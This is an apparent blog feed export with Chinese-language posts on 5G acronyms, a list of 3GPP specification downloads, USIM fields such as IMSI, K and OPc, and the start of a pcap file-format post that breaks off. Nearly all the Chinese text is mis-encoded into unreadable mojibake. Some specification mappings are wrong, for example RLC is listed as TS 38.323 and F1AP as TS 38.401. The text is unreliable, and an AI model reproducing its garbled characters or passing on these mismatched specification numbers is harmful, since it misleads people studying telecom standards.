Management</td><td>ç»Ÿä¸€æ•°æ®ç®¡ç†</td></tr><tr><td>UL</td><td>Uplink</td><td>ä¸Šè¡Œé“¾è·¯</td></tr><tr><td>UPDS</td><td>UE policy delivery service</td><td>UE ç­–ç•¥äº¤ä»˜æœåŠ¡</td></tr><tr><td>UPF</td><td>User Plane Function</td><td>ç”¨æˆ·é¢åŠŸèƒ½</td></tr><tr><td>UPSC</td><td>UE Policy Section Code</td><td>UE ç­–ç•¥éƒ¨åˆ†ä»£ç </td></tr><tr><td>UPSI</td><td>UE Policy Section Identifier</td><td>UE ç­–ç•¥éƒ¨åˆ†æ ‡è¯†ç¬¦</td></tr><tr><td>URN</td><td>Uniform Resource Name</td><td>ç»Ÿä¸€èµ„æºåç§°</td></tr><tr><td>URSP</td><td>UE Route Selection Policy</td><td>UE è·¯ç”±é€‰æ‹©ç­–ç•¥</td></tr><tr><td>USS</td><td>UAS Service Supplier</td><td>UAS æœåŠ¡ä¾›åº”å•†</td></tr><tr><td>UUAA</td><td>USS UAV Authorization/Authentication</td><td>USS æ— äººæœºæˆæƒ/è®¤è¯</td></tr><tr><td>V2X</td><td>Vehicle-to-Everything</td><td>è½¦è”ç½‘</td></tr><tr><td>V2XP</td><td>V2X policy</td><td>V2X ç­–ç•¥</td></tr><tr><td>W-AGF</td><td>Wireline Access Gateway Function</td><td>æœ‰çº¿æ¥å…¥ç½‘å…³åŠŸèƒ½</td></tr><tr><td>WLAN</td><td>Wireless Local Area Network</td><td>æ— çº¿å±€åŸŸç½‘</td></tr><tr><td>WUS</td><td>Wake-up signal</td><td>å”¤é†’ä¿¡å·</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> LTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LTE </tag>
            
            <tag> 5G </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3GPP 5G å¸¸ç”¨åè®®è§„èŒƒä¸‹è½½æ•´ç†</title>
      <link href="/posts/be65a0a1/"/>
      <url>/posts/be65a0a1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/LM7ZfywvFQ4NDVG.png" class="lazyload" data-srcset="https://i.loli.net/2021/11/13/LM7ZfywvFQ4NDVG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211113102023734"></p><h2 id="å¸¸ç”¨åè®®æ ‡å‡†">å¸¸ç”¨åè®®æ ‡å‡†</h2><div class="story post-story"><h3 id="ç³»ç»Ÿæ¶æ„">ç³»ç»Ÿæ¶æ„</h3><table><thead><tr><th>ç¼–å·</th><th>åè®®</th><th>å…¨ç§°</th><th>æè¿°</th><th>ä¸‹è½½åœ°å€</th></tr></thead><tbody><tr><td>1</td><td>RAN Architecture</td><td>NG-RAN Architecture description</td><td>ç³»ç»Ÿæ¶æ„</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.473">TS 38.473</a></td></tr><tr><td>2</td><td>Overall</td><td>NR and NG-RAN Overall Description</td><td>NR and NG-RAN æ€»ä½“æŠ€æœ¯è¦æ±‚</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.300">TS 38.300</a></td></tr><tr><td>3</td><td>5GS</td><td>NG-RAN Architecture description</td><td>ç³»ç»Ÿæ¶æ„</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/23_series/23.501">TS 23.501</a></td></tr><tr><td>4</td><td>5GC</td><td>Procedures for the 5G System (5GS)</td><td>ç³»ç»Ÿæ¶æ„</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/23_series/23.502">TS 23.502</a></td></tr></tbody></table><h3 id="æ— çº¿ä¾§ï¼ˆRAN-NRï¼‰">æ— çº¿ä¾§ï¼ˆRAN/NRï¼‰</h3><table><thead><tr><th>ç¼–å·</th><th>åè®®</th><th>å…¨ç§°</th><th>æè¿°</th><th>ä¸‹è½½åœ°å€</th></tr></thead><tbody><tr><td>1</td><td>RRC</td><td>Radio Resource Control</td><td>æ— çº¿èµ„æºæ§åˆ¶</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.331">TS 38.331</a></td></tr><tr><td>2</td><td>SDAP</td><td>Service Data Adaptation Protocol</td><td>æœåŠ¡æ•°æ®é€‚é…åè®®</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/37_series/37.324">TS 37.324</a></td></tr><tr><td>3</td><td>PDCP</td><td>Packet Data Convergence Protocol</td><td>åˆ†ç»„æ•°æ®æ±‡èšåè®®</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.323">TS 38.323</a></td></tr><tr><td>4</td><td>RLC</td><td>Radio Link Control</td><td>æ— çº¿é“¾è·¯å±‚æ§åˆ¶åè®®</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.322">TS 38.322</a></td></tr><tr><td>5</td><td>MAC</td><td>Media Access Control</td><td>åª’ä½“æ¥å…¥æ§åˆ¶åè®®</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.321">TS 38.321</a></td></tr><tr><td>6</td><td>F1Ap</td><td>F1 Application Protocol</td><td>F1 åº”ç”¨ç¨‹åºåè®®</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.401">TS 38.401</a></td></tr><tr><td>7</td><td>XnAp</td><td>Xn Application Protocol</td><td>Xn åº”ç”¨ç¨‹åºåè®®</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.423">TS 38.423</a></td></tr></tbody></table><h3 id="æ ¸å¿ƒç½‘ï¼ˆCN-5GCï¼‰">æ ¸å¿ƒç½‘ï¼ˆCN/5GCï¼‰</h3><table><thead><tr><th>ç¼–å·</th><th>åè®®</th><th>å…¨ç¨‹</th><th>æè¿°</th><th>ä¸‹è½½åœ°å€</th></tr></thead><tbody><tr><td>1</td><td>NgAp</td><td>NG Application Protocol</td><td>NG åº”ç”¨ç¨‹åºåè®®</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/38_series/38.413">TS 38.413</a></td></tr><tr><td>2</td><td>NAS</td><td>Non-Access-Stratum</td><td>éæ¥å…¥å±‚</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/24_series/24.501/">TS 24.501</a></td></tr><tr><td>3</td><td>PCF</td><td>Policy Control Function</td><td>ç­–ç•¥æ§åˆ¶åŠŸèƒ½</td><td><a href="https://www.3gpp.org/ftp/Specs/archive/29_series/29.507/">TS 29.507</a></td></tr></tbody></table><p><img src="https://i.loli.net/2021/11/14/L9VmBZsrEA6tfJo.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/L9VmBZsrEA6tfJo.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="5gåè®®"></p><p><a href="https://www.3gpp.org/ftp/Specs/archive/">3GPPåè®®ä¸‹è½½é“¾æ¥</a></p></div><h2 id="æ•´ä½“">æ•´ä½“</h2><div class="story post-story"><ul><li>æ•´ä½“æè¿°ï¼šTS38.300</li><li>5Gæ¥å…¥ç½‘æ¶æ„ï¼šTS38.401</li></ul></div><h2 id="é¢‘ç‚¹ç›¸å…³">é¢‘ç‚¹ç›¸å…³</h2><div class="story post-story"><ul><li>é¢‘ç‡ã€é¢‘ç‚¹ç›¸å…³F R1ï¼šTS38.101-1</li><li>é¢‘ç‡ã€é¢‘ç‚¹ç›¸å…³F R2ï¼šTS38.101-2</li><li>EN-DCç›¸å…³ï¼šTS38.101-3</li><li>é¢‘ç‡ã€é¢‘ç‚¹ç›¸å…³åŸºç«™ç±»å‹ï¼šTS38.104</li></ul></div><h2 id="ç©ºå£åè®®L2L3">ç©ºå£åè®®L2L3</h2><div class="story post-story"><ul><li>SDAPå±‚åè®®ï¼šTS37.324</li><li>5G-RANæ— çº¿æ¥å£æ¡†æ¶æ€»ä½“æè¿°ï¼šTS38.300</li><li>å®šä¹‰äº†UEç©ºé—²æ€å’Œéæ´»åŠ¨æ€ä¸‹è½½æ¥å…¥å±‚éƒ¨åˆ†çš„è¿‡ç¨‹ï¼ˆåŒ…æ‹¬PLMNé€‰æ‹©ã€å°åŒºé€‰æ‹©ã€é‡é€‰ç›¸å…³é—¨é™ï¼‰ï¼šTS38.304</li><li>MACå±‚åè®®ï¼šTS38.321</li><li>RLCåè®®å±‚ï¼šTS38.323</li><li>RRCå±‚åè®®ï¼šTS38.331</li></ul></div><h2 id="ç©ºå£åè®®å±‚L1">ç©ºå£åè®®å±‚L1</h2><div class="story post-story"><ul><li>ç‰©ç†å±‚æ¦‚è¿°ï¼šTS38.201</li><li>ç‰©ç†å±‚çš„åŠŸèƒ½ä¸æœåŠ¡ï¼šTS38.202</li><li>ç‰©ç†å±‚ä¿¡é“å®šä¹‰ï¼šTS38.211ï¼ˆç‰©ç†å±‚ä¿¡å·çš„ç”Ÿæˆã€è°ƒåˆ¶ï¼ŒDMRSå’Œé¢å¤–DMRSï¼ŒPRACH configuration indexï¼ŒPoint Aç­‰ä»‹ç»ï¼‰</li><li>ä¼ è¾“ä¿¡é“å’Œæ§åˆ¶ä¿¡é“çš„æ•°æ®å¤„ç†ï¼šTS38.212ï¼ˆåŒ…æ‹¬å¤ç”¨ï¼Œä¿¡é“ç¼–ç ï¼Œäº¤ç»‡ï¼ŒDCIï¼ŒDMRSç«¯å£å·ç­‰ï¼‰</li><li>ç‰©ç†å±‚æ§åˆ¶è¿‡ç¨‹ï¼šTS38.213ï¼ˆåŒæ­¥ï¼Œä¸Šè¡ŒåŠŸæ§ï¼Œéšæœºæ¥å…¥ï¼ŒUEä¸ŠæŠ¥å’Œæ¥æ”¶æ§åˆ¶æ¶ˆæ¯çš„è¿‡ç¨‹ï¼ŒSSBç­‰ï¼‰</li><li>ç‰©ç†å±‚æ•°æ®è¿‡ç¨‹ï¼šTS38.214ï¼ˆåŠŸç‡æ§åˆ¶ï¼ŒPDSCH PUSCHæ•°æ®å¤„ç†è¿‡ç¨‹ï¼Œæ­¥é•¿275ï¼‰</li><li>ç‰©ç†å±‚æµ‹é‡ï¼šTS38.215ï¼ˆUEå’Œç½‘ç»œçš„æµ‹é‡æ§åˆ¶ï¼ŒUEæµ‹é‡èƒ½åŠ›ï¼‰</li></ul></div><h2 id="Xnå£åè®®">Xnå£åè®®</h2><div class="story post-story"><ul><li>Xnæ¥å£ç»¼è¿°ï¼šTS38.420</li><li>Xnå£ç‰©ç†å±‚ï¼šTS38.421</li><li>Xnå¦‚ä½•ä¼ ä¿¡ä»¤ï¼šTS38.422</li><li>NG-RANä¿¡ä»¤ï¼šTS38.423</li><li>Xnæ•°æ®ä¼ è¾“è§„èŒƒï¼šTS38.424</li><li>Xnç”¨æˆ·é¢åè®®æ ˆï¼šTS38.425</li></ul></div><h2 id="NR-UEèƒ½åŠ›ç›¸å…³">NR UEèƒ½åŠ›ç›¸å…³</h2><div class="story post-story"><ul><li>æ‰‹æœºçš„æœ€ä½æ€§èƒ½è¦æ±‚ï¼šTS38.101-4</li><li>ç»ˆç«¯å®šä½ç›¸å…³åè®®ï¼šTS38.305</li><li>UEåœ¨æ¥å…¥ç½‘çš„èƒ½åŠ›å‚æ•°ï¼šTS38.306</li><li>UEæ”¯æŒçš„ç‰¹æ€§è¦æ±‚ï¼šTS38.307</li></ul></div><h2 id="NGæ¥å£åè®®">NGæ¥å£åè®®</h2><div class="story post-story"><ul><li>NGæ¥å£ç»¼è¿°ï¼šTS38.410</li><li>NGæ¥å£ç›¸å…³ç‰©ç†å±‚ï¼šTS38.411</li><li>NGå¦‚ä½•ä¼ è¾“ä¿¡ä»¤æ¶ˆæ¯ï¼šTS38.412</li><li>NG-RANå’ŒAMFæ§åˆ¶ä¿¡ä»¤ï¼šTS38.413</li><li>NGæ¥å£ç”¨æˆ·é¢æ•°æ®ï¼šTS38.414</li><li>ç”¨æˆ·é¢åè®®ï¼šTS38.415</li></ul></div><h2 id="F1æ¥å£åè®®">F1æ¥å£åè®®</h2><div class="story post-story"><ul><li>æ¶æ„ç»¼è¿°ï¼šTS38.470</li><li>ç‰©ç†å±‚ï¼šTS38.471</li><li>ä¿¡ä»¤å¦‚ä½•ä¼ ï¼šTS38.472</li><li>æ§åˆ¶é¢ï¼šTS38.473</li><li>æ•°æ®é¢ï¼šTS38.474</li><li>æ•°æ®é¢åè®®ï¼šTS38.475</li></ul></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> LTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LTE </tag>
            
            <tag> 5G </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LTE(4G)â€“USIMåŸºç¡€</title>
      <link href="/posts/a71e591c/"/>
      <url>/posts/a71e591c/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/Ny89ukcrYDm61vS.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/13/Ny89ukcrYDm61vS.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><h2 id="USIMæ˜¯åœ¨èº«ä»½éªŒè¯ä¸­çš„ä½œç”¨">USIMæ˜¯åœ¨èº«ä»½éªŒè¯ä¸­çš„ä½œç”¨</h2><div class="story post-story"><p>å½“æ‚¨å¯åŠ¨æ‰‹æœºæ—¶ï¼Œå…¶ä¸­çš„åŸºå¸¦æ¨¡å—ä¼šä¸å¡ä¸Šçš„ USIM åº”ç”¨ç¨‹åºè¿›è¡Œé€šä¿¡ã€‚</p><p>å½“éœ€è¦å‘ç½‘ç»œè¿›è¡Œèº«ä»½éªŒè¯å¹¶éªŒè¯ç½‘ç»œæœ¬èº«æ—¶ï¼ŒåŸºå¸¦æ¨¡å—å°†æä¾›çš„è´¨è¯¢ä¿¡æ¯ä»ç½‘ç»œå‘é€åˆ° USIMï¼ŒUSIM æ‰§è¡ŒåŠ å¯†ä»¥ç”Ÿæˆå¯¹ç½‘ç»œå‘å‡ºçš„èº«ä»½éªŒè¯è´¨è¯¢çš„å“åº”ï¼Œç„¶å USIMé—®é¢˜æ˜¯å®ƒè‡ªå·±å¯¹ç½‘ç»œçš„æŒ‘æˆ˜ã€‚</p></div><h2 id="Whatâ€™s-Inside">Whatâ€™s Inside?</h2><div class="story post-story"><h3 id="æ‰€æœ‰GSMç”¨äºä¼ ç»ŸSIMåº”ç”¨ç¨‹åºçš„GSMå†…å®¹">æ‰€æœ‰GSMç”¨äºä¼ ç»ŸSIMåº”ç”¨ç¨‹åºçš„GSMå†…å®¹</h3><p>ä¸€èˆ¬æ¥è¯´USIMä¹Ÿæœ‰èƒ½åŠ›åœ¨GSMç½‘ç»œä¸­ä½œä¸ºSIMsè¿è¡Œï¼Œæ¯•ç«Ÿå®ƒåªæ˜¯ä¸€ä¸ªä¸åŒçš„è½¯ä»¶å †æ ˆã€‚æˆ‘ä»¬åœ¨è¿™é‡Œä¸æ¶‰åŠGSM SIMã€‚</p><h3 id="ICCID">ICCID</h3><p>ç”±äºUSIMåªæ˜¯åœ¨é€šç”¨é›†æˆç”µè·¯å¡ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œå› æ­¤å®ƒå¾—åˆ°äº†ICCIDæˆ–é€šç”¨é›†æˆç”µè·¯å¡IDã€‚é€šå¸¸è¿™æ˜¯å¡æœ¬èº«ä¸Šå°æœ‰çš„é•¿æ¡å½¢ç /æ•°é‡ã€‚</p><p>ç½‘ç»œä¸€èˆ¬ä¸å…³å¿ƒè¿™ä¸ªå€¼ï¼Œä½†è¿è¥å•†å¯èƒ½ä¼šæŠŠå®ƒç”¨äºç‰©æµï¼Œå¦‚å‘è´§å¡ã€‚</p><h3 id="PIN-PUK">PIN &amp; PUK</h3><p>pinå’ŒPUKsæ˜¯è§£é”å¡çš„å¯†ç ã€‚å¦‚æœä½ çš„PINé”™äº†å¤ªå¤šæ¬¡ï¼Œä½ éœ€è¦æ›´é•¿çš„PUKæ¥è§£é”å®ƒã€‚</p><p>è¿™äº›å­—æ®µå¯ä»¥å†™å…¥(åœ¨éªŒè¯åˆ°å¡ç‰‡æ—¶)ï¼Œä½†ä¸èƒ½ç›´æ¥è¯»å–ï¼Œåªæœ‰å°è¯•ã€‚(ä½ å¯ä»¥å°è¯•ä¸€ä¸ªå¯†ç ï¼Œä½†ä½ ä¸èƒ½çœ‹åˆ°å®ƒçš„è®¾ç½®)ã€‚</p><p>æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œç»ˆç«¯ä¼šè¯¢é—®å¡æ˜¯å¦æ­£ç¡®ï¼Œä½†ç»ˆç«¯ä¹Ÿä¸çŸ¥é“å¯†ç ã€‚</p><h3 id="IMSI">IMSI</h3><p>æ¯ä¸ªè®¢é˜…è€…éƒ½æœ‰ä¸€ä¸ªIMSIï¼Œæ˜¯ä¸€ä¸ªå›½é™…ç§»åŠ¨ç”¨æˆ·æ ‡è¯†ã€‚</p><p>IMSISæ˜¯åˆ†å±‚çš„ï¼Œä»3ä½æ•°ç§»åŠ¨å›½å®¶/åœ°åŒºä»£ç MCCå¼€å§‹ï¼Œç„¶åç§»åŠ¨ç½‘ç»œä»£ç (MNC)(2/3ä½)ä»¥åŠæœ€ç»ˆæ˜¯ç§»åŠ¨è®¢é˜…è¯†åˆ«å·(MSIN)ï¼Œç”±æ“ä½œå‘˜åˆ†é…ç»™ç”¨æˆ·çš„å”¯ä¸€å·ç ç½‘ç»œã€‚</p><p>è¿™æ„å‘³ç€è™½ç„¶ä¸¤ä¸ªè®¢é˜…è€…ç†è®ºä¸Šå¯ä»¥å…·æœ‰ç›¸åŒçš„MSINï¼Œä½†å®ƒä»¬ä¸ä¼šåˆ†äº«ç›¸åŒçš„MNCå’ŒMCCï¼Œå› æ­¤ISMIä»ç„¶æ˜¯å”¯ä¸€çš„ã€‚</p><p>é™¤éè®¢æˆ·æ›´æ”¹è¿è¥å•†æ—¶ï¼ŒIMSIæ°¸è¿œä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œé™¤éæ–°çš„æ“ä½œå‘˜å‘å‡ºæ–°çš„USIMå¡ï¼Œå…·æœ‰ä¸åŒçš„IMSIï¼ˆä¸åŒçš„MNCï¼‰ã€‚</p><p>MSINä¸ç”µè¯å·ç /MSISDNå·ç ä¸åŒï¼Œä½†IMSIé€šå¸¸å…·æœ‰ç½‘ç»œç›¸å…³è”çš„MSISDNã€‚è¿™å…è®¸æ‚¨åœ¨ä¸æ›´æ”¹USIM / SIMçš„æƒ…å†µä¸‹ç§»æ¤/æ›´æ”¹MSISDNå·ç ã€‚</p><h3 id="K-â€“-Subscriber-Key">K â€“ Subscriber Key</h3><p>ä»…é’ˆå¯¹è®¢æˆ·å’Œè®¤è¯ä¸­å¿ƒ(AUC/HSS)å·²çŸ¥çš„è®¢æˆ·çš„ç§˜å¯†å¯†é’¥ã€‚</p><p>æ‰€æœ‰èº«ä»½éªŒè¯éƒ½ä¾èµ–äºä»…ä¸ºUSIMå’ŒAUC/HHSå·²çŸ¥çš„å•ä¸ªå¯†é’¥(k)çš„åŸåˆ™ã€‚</p><h3 id="OP-â€“-Operator-Code">OP â€“ Operator Code</h3><p>æ“ä½œå‘˜ä»£ç  - æ¥è‡ªå•ä¸ªæ“ä½œå‘˜çš„æ‰€æœ‰SIMå¡ç›¸åŒã€‚</p><p>ä¸Kç»“åˆä½¿ç”¨ä½œä¸ºä¸€äº›èº«ä»½éªŒè¯/æˆæƒåŠ å¯†ç”Ÿæˆçš„è¾“å…¥ã€‚</p><p>ç”±äºæ“ä½œå‘˜ä»£ç å¯¹ç½‘ç»œä¸­çš„æ‰€æœ‰è®¢é˜…è€…éƒ½æ˜¯é€šç”¨çš„ï¼Œå› ä¸ºè¦æ¢å¤æ­¤å¯†é’¥å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œå› æ­¤é€šå¸¸ä½¿ç”¨OPCã€‚</p><h3 id="OPc-â€“-Operator-Code-Derived">OPc â€“ Operator Code (Derived)</h3><p>å½“USIMç”¨Ké”®å†™å…¥USIMæ—¶ï¼Œå¯ä»¥é¢„å…ˆè®¡ç®—Operatorä»£ç ï¼Œè€Œä¸æ˜¯ç»™å‡ºæ¯ä¸ªUSIMçš„æ“ä½œå‘˜ä»£ç ã€‚</p><p>è¿™æ„å‘³ç€OPä¸å­˜å‚¨åœ¨USIMä¸Šã€‚</p><p><code>OPc=Encypt-Algo(OP,Key)</code></p><h3 id="PLMN-Public-Land-Mobile-Network">PLMN (Public Land Mobile Network)</h3><p>PLMNæ˜¯MCCå’ŒMNCçš„ç»„åˆï¼Œç”¨äºè¯†åˆ«è¿è¥å•†çš„æ— çº¿æ¥å…¥ç½‘(RAN)ã€‚</p><p>è™½ç„¶åœ¨å¤§å¤šæ•°USIMsä¸­æ²¡æœ‰ç‰¹å®šçš„PLMNå­—æ®µï¼Œä½†å€¼å¾—ç†è§£çš„æ˜¯ï¼Œæœ‰å‡ ä¸ªå­—æ®µéœ€è¦PLMNã€‚</p><h3 id="HPLMNwAcT-HPLMN-selector-with-Access-Technology">HPLMNwAcT (HPLMN selector with Access Technology)</h3><p>æŒ‰ä¼˜å…ˆçº§é¡ºåºåŒ…å«æŒ‡å®šæ¥å…¥æŠ€æœ¯çš„Home-PLMNç¼–ç </p><p>è¿™å…è®¸USIMè®¡ç®—å‡ºå“ªä¸ªPLMNé™„åŠ åˆ°å“ªä¸ªè®¿é—®æŠ€æœ¯(RAN)ï¼Œä¾‹å¦‚ï¼Œå¦‚æœæ“ä½œå‘˜çš„PLMNæ˜¯50599ï¼Œæˆ‘ä»¬å¯ä»¥</p><ul><li>50599 E-UTRAN</li><li>50599 UTRAN</li><li></li></ul><p>å°è¯•4Gï¼Œå¦‚æœå¤±è´¥äº†å°±ä½¿ç”¨3Gã€‚</p><p>åœ¨è¿è¥å•†å¯èƒ½åˆä½œå…±äº«ä¸åŒåœ°åŒºçš„ç½‘ç»œçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å…ˆè®¾ç½®è¿è¥å•†çš„PLMNï¼Œç„¶åå†è®¾ç½®åˆä½œè¿è¥å•†çš„PLMNã€‚</p><h3 id="OPLMNwACT-Operator-controlled-PLMN-selector-with-Access-Technology">OPLMNwACT (Operator controlled PLMN selector with Access Technology)</h3><p>è¿™æ˜¯è¿è¥å•†ä¸ä¼˜å…ˆé¡ºåºå’Œè®¿é—®æŠ€æœ¯æœ‰å…³æ¼«æ¸¸åè®®çš„PLMNSåˆ—è¡¨ã€‚</p><p>æ“ä½œå‘˜å¯ä»¥æ¼«æ¸¸åˆ°è¿è¥å•†Xï¼Œä½†ä»…å…è®¸UTRANè®¿é—®ï¼Œè€Œä¸æ˜¯E-TRANã€‚</p><h3 id="FEHPLMN-Equivalent-HPLMN">FEHPLMN (Equivalent HPLMN)</h3><p>ç”¨äºå®šä¹‰ç­‰æ•ˆçš„HPMNï¼Œä¾‹å¦‚ï¼Œå¦‚æœä¸¤ä¸ªè½½æ³¢åˆå¹¶å¹¶ä»æœ‰ä¸¤ä¸ªPLMNã€‚</p><h3 id="FPLMN-Forbidden-PLMN-list">FPLMN (Forbidden PLMN list)</h3><p>ç”¨æˆ·ä¸èƒ½æµè§ˆçš„plmnåˆ—è¡¨ã€‚</p><h3 id="HPPLMN-Higher-Priority-PLMN-search-period">HPPLMN (Higher Priority PLMN search period)</h3><p>åœ¨HPLMNWACTåˆ—è¡¨ä¸­çš„æ¯ä¸ªPLMN / AccessæŠ€æœ¯ä¹‹é—´èŠ±è´¹å¤šé•¿æ—¶é—´ã€‚</p><h3 id="ACC-Access-Control-Class">ACC (Access Control Class)</h3><p>ACCå…è®¸0-15çš„å€¼ï¼Œå¹¶ç¡®å®šè®¢æˆ·çš„è®¿é—®æ§åˆ¶ç±»ã€‚</p><p>åœ¨è‹±å›½ï¼ŒACCå€¼ç”¨äºé™åˆ¶ç´§æ€¥æƒ…å†µæœŸé—´å¯¹æ‰‹æœºç½‘ç»œçš„å¹³æ°‘è®¿é—®ã€‚</p><p>æ™®é€šç”¨æˆ·åœ¨0 - 9.è¾ƒé«˜çš„ä¼˜å…ˆçº§ç”¨æˆ·åˆ†é…12-14ä¸­çš„æ™®é€šè®¢é˜…è€…ã€‚</p><p>åœ¨ç´§æ€¥æƒ…å†µä¸‹ï¼Œç¦ç”¨èŒƒå›´0 - 9ä¸­çš„æŸäº›æˆ–æ‰€æœ‰è®¿é—®ç±»ã€‚</p><p>è¿™æ„å‘³ç€å¯ä»¥å°†æœåŠ¡æˆªæ­¢åˆ°å…·æœ‰0-9çš„ACCå€¼çš„å…¬ä¼—ï¼Œä½†ç¬¬ä¸€ä¸ªå“åº”è€…å’Œç´§æ€¥æœåŠ¡ç­‰äººå°†å…·æœ‰æ›´é«˜çš„ACCå€¼ï¼Œç½‘ç»œå°†å…è®¸å®ƒä»¬é™„åŠ ã€‚</p><h3 id="AD-Administrative-Data">AD (Administrative Data)</h3><p>ä¸ACCå­—æ®µä¸€æ ·ï¼ŒADå­—æ®µå…è®¸è¿è¥å•†åœ¨æ²¡æœ‰ä¸ç½‘ç»œé™„åŠ çš„æœ‰æ•ˆæ”¯ä»˜è®¢é˜…è€…çš„æƒ…å†µä¸‹é©±åŠ¨æµ‹è¯•ç½‘ç»œ</p><p>The defined levels are:</p><ul><li>'00â€™æ­£å¸¸è¿è¡Œã€‚</li><li>'80â€™å‹æ‰¹å‡†æ“ä½œã€‚</li><li>'01â€™æ­£å¸¸è¿è¡Œ+ç‰¹å®šè®¾æ–½ã€‚</li><li>'81â€™å‹æ‰¹å‡†æ“ä½œ+ç‰¹å®šè®¾æ–½ã€‚</li><li>'02â€™ç»´æŠ¤ï¼ˆç¦»çº¿ï¼‰ã€‚</li><li>'04â€™å•å…ƒæµ‹è¯•æ“ä½œã€‚</li></ul><h3 id="GID-1-2-â€“-Group-Identifier">GID 1 / 2 â€“ Group Identifier</h3><p>ä¸¤ä¸ªç»„æ ‡è¯†ç¬¦å­—æ®µï¼Œå…è®¸æ“ä½œç¬¦ä¸ºç‰¹å®šåº”ç”¨ç¨‹åºæ ‡è¯†ä¸€ç»„USIMsã€‚</p><h3 id="SPN-Service-Provider-Name">SPN (Service Provider Name)</h3><p>SPNæ˜¯åŒ…å«ç½‘ç»œçš„äººç±»å¯è¯»åç§°çš„å¯é€‰å­—æ®µã€‚</p><p>SPNå…è®¸MVNOSä»¥æ‰‹æœºä¸Šçš„æ“ä½œå‘˜æä¾›è‡ªå·±çš„USIMã€‚</p><h3 id="ECC-Emergency-Call-Codes">ECC (Emergency Call Codes)</h3><p>å¤šè¾¾6ä½æ•°çš„ä»£ç é•¿æ—¶é—´å…è®¸ä»ä¸»å±å¹•/ç´§æ€¥/ä¸ç»è¿‡èº«ä»½éªŒè¯ç­‰æ‹¨å·ã€‚</p><h3 id="MSISDN">MSISDN</h3><p>ç§»åŠ¨å°å›½é™…è®¢æˆ·ç›®å½•å·ç ã€‚E.164æ ¼å¼çš„ç”¨æˆ·çš„ç”µè¯å·ç ã€‚</p><p>è¿™æ˜¯å¯é€‰çš„ï¼Œå› ä¸ºç§»æ¤å¯èƒ½ä¼šè¦†ç›–æ­¤æ“ä½œï¼Œå› æ­¤å®ƒå¹¶ä¸æ€»æ˜¯åŒ¹é…ã€‚</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> LTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LTE </tag>
            
            <tag> USIM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.PcapåŒ…å­¦ä¹ </title>
      <link href="/posts/a30ed9b8/"/>
      <url>/posts/a30ed9b8/</url>
      
        <content type="html"><![CDATA[<h2 id="pacp-cap-æ–‡ä»¶ç»“æ„">.pacp/.cap æ–‡ä»¶ç»“æ„</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20211106090545.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20211106090545.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>1.Pcap Header</strong></p><blockquote><p>æ–‡ä»¶å¤´ï¼Œæ¯ä¸€ä¸ªpcapæ–‡ä»¶åªæœ‰ä¸€ä¸ªæ–‡ä»¶å¤´ï¼Œæ€»å…±å 24ï¼ˆB ï¼‰å­—èŠ‚ï¼Œä»¥ä¸‹æ˜¯æ€»å…±7ä¸ªå­—æ®µçš„å«ä¹‰ã€‚</p></blockquote><details green><summary> detail </summary>              <div class='content'>              <ul><li><p>Magic(4B)ï¼š æ 